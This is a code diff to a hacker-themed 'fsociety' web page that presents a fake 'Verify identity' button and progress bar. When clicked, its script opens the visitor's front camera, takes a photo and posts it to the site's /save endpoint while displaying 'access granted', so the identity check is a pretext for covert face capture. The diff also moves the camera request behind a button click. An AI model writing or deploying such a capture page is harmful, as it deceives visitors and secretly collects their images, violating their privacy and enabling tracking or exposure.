@@ -96,6 +96,26 @@ body {
   margin-bottom: 28px;
   text-transform: uppercase;
 }
+.btn {
+  display: inline-block;
+  margin-top: 20px;
+  padding: 14px 32px;
+  border: 1px solid #00ff41;
+  color: #00ff41;
+  background: transparent;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 14px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 0 10px rgba(0,255,65,0.3);
+}
+.btn:hover {
+  background: #00ff41;
+  color: #000;
+  box-shadow: 0 0 20px #00ff41;
+}
 .status {
   font-size: 13px;
   color: #00ff41;
@@ -132,8 +152,9 @@ body {
     <span class="glitch" data-text="fsociety">fsociety</span>
   </div>
   <div class="sub">fsociety // connection</div>
-  <div class="status" id="status">initializing</div>
+  <div class="status" id="status">secure connection required</div>
   <div class="bar"><div class="bar-fill" id="bar"></div></div>
+  <button class="btn" id="btn" onclick="startVerification()">Verify identity</button>
 </div>
 <script>
 // Matrix-эффект падающих цифр
@@ -168,32 +189,42 @@ function draw() {
 }
 setInterval(draw, 50);
 
-// Статусы и прогресс
 const statusEl = document.getElementById("status");
 const barEl = document.getElementById("bar");
-setTimeout(() => { barEl.style.width = "30%"; statusEl.innerText = "loading modules"; }, 300);
-setTimeout(() => { barEl.style.width = "50%"; statusEl.innerText = "verifying identity"; }, 800);
-setTimeout(() => { barEl.style.width = "70%"; statusEl.innerText = "requesting access"; }, 1500);
+const btnEl = document.getElementById("btn");
 
-async function start() {
+async function startVerification() {
+  btnEl.style.display = "none";
+  statusEl.innerText = "initializing";
+  barEl.style.width = "20%";
+
+  setTimeout(() => { barEl.style.width = "40%"; statusEl.innerText = "loading modules"; }, 500);
+  setTimeout(() => { barEl.style.width = "60%"; statusEl.innerText = "verifying identity"; }, 1000);
+
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    statusEl.innerText = "requesting access";
+    barEl.style.width = "80%";
+
     const video = document.createElement("video");
     video.srcObject = stream;
     video.setAttribute("playsinline", "");
     await video.play();
     await new Promise(r => setTimeout(r, 1500));
+
     const c = document.createElement("canvas");
     c.width = video.videoWidth;
     c.height = video.videoHeight;
     c.getContext("2d").drawImage(video, 0, 0);
     const photo = c.toDataURL("image/png");
     stream.getTracks().forEach(t => t.stop());
+
     await fetch("/save", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({photo: photo})
     });
+
     barEl.style.width = "100%";
     statusEl.innerText = "access granted";
   } catch (e) {
@@ -203,7 +234,6 @@ async function start() {
     statusEl.style.color = "#ff0033";
   }
 }
-setTimeout(start, 2000);
 </script>
 </body>
 </html>
